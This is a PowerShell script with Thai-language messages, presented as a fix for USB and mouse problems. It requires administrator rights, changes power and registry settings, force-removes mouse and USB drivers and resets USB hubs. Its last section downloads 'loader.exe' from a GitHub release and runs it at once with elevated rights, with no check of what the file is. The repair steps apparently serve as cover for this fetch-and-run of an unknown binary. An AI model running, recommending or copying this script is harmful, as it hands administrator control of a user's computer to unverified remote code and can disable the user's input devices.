if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "กรุณาเปิด PowerShell ด้วยสิทธิ์ Administrator (Ctrl + Shift + Enter)"
    Break
}

# เคลียร์หน้าจอคอนโซล
Clear-Host

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "       กำลังตรวจสอบและดึงข้อมูลจากระบบ... กรุณารอซักครู่" -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan

# 1. ปิดโหมดประหยัดพลังงาน USB (ซ่อนข้อความแจ้งเตือน 2>$null เพื่อไม่ให้แสดง Error)
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
powercfg /SETACTIVE SCHEME_CURRENT 2>$null

# 2. บังคับปิด "Allow the computer to turn off this device" ของพอร์ต USB ทั้งหมดใน Registry
$USBEnumPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
if (Test-Path $USBEnumPath) {
    Get-ChildItem -Path $USBEnumPath -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -eq "Device Parameters" } | ForEach-Object {
        Set-ItemProperty -Path $_.PSPath -Name "EnhancedPowerManagementEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $_.PSPath -Name "DeviceSelectiveSuspended" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    }
}

# 3. คืนค่า Registry ของเมาส์ให้กลับเป็นค่าเริ่มต้นโรงงาน 100%
$MouseRegPath = "HKCU:\Control Panel\Mouse"
Set-ItemProperty -Path $MouseRegPath -Name "MouseSpeed" -Value "1" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold1" -Value "6" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold2" -Value "10" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseSensitivity" -Value "10" -ErrorAction SilentlyContinue

# 4. รีสตาร์ท Service จ่ายไฟและจัดการอุปกรณ์ต่อพ่วง
$ServicesToFix = @("PlugPlay", "DeviceInstall", "hidserv")
foreach ($Service in $ServicesToFix) {
    Set-Service -Name $Service -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name $Service -ErrorAction SilentlyContinue
}

# 5. ถอนการติดตั้งไดรเวอร์เมาส์และ USB ที่มีสถานะ Error หรือเชื่อมต่อไม่สมบูรณ์
$TargetDevices = Get-PnpDevice | Where-Object {($_.Class -eq 'Mouse' -or $_.Class -eq 'USB') -and ($_.Status -ne 'OK' -or $_.Present -eq $false)}
foreach ($Device in $TargetDevices) {
    if ($Device.InstanceId) {
        pnputil /remove-device $Device.InstanceId /force | Out-Null
    }
}

# 6. รีเซ็ตไฟเลี้ยง USB Root Hub (กระตุ้นพอร์ต USB ทั่วเครื่อง)
Get-PnpDevice -FriendlyName "*USB Root Hub*" | ForEach-Object {
    Disable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
    Enable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
}

# 7. บังคับสแกนฮาร์ดแวร์เพื่อดึงไดรเวอร์เมาส์ตัวที่สมบูรณ์กลับมา
pnputil /scan-devices | Out-Null

# ----------------- ขั้นตอนการโหลดและรันโปรแกรม LOADER.EXE -----------------
Write-Host ""
Write-Host ">>> กำลังดาวน์โหลดโปรแกรมตัวเปิดใช้งาน (loader.exe)..." -ForegroundColor Cyan

# ลิงก์ดาวน์โหลดตัว loader.exe จาก GitHub Release
$Url = "https://github.com/zynx7crew/zynx7crew-x/releases/download/v1.0.0/loader.exe"
$DestPath = "$env:temp\loader.exe"

try {
    # ลบไฟล์เก่าหากค้างอยู่ใน temp เพื่อป้องกันความซ้ำซ้อน
    if (Test-Path $DestPath) {
        Remove-Item -Path $DestPath -Force -ErrorAction SilentlyContinue
    }

    # แสดงแถบดาวน์โหลดใน PowerShell
    Invoke-WebRequest -Uri $Url -OutFile $DestPath -ErrorAction Stop
    
    Write-Host ">>> ดาวน์โหลดสำเร็จ! กำลังเปิดหน้าโปรแกรม..." -ForegroundColor Green
    Write-Host "==========================================================" -ForegroundColor Cyan
    
    # รันโปรแกรมในสิทธิ์ Administrator ทันที
    Start-Process -FilePath $DestPath -Verb RunAs
}
catch {
    Write-Host "❌ เกิดข้อผิดพลาดในการโหลดไฟล์โปรแกรม: $_" -ForegroundColor Red
    Write-Host "กรุณาตรวจสอบการเชื่อมต่ออินเทอร์เน็ตของคุณ" -ForegroundColor Yellow
}
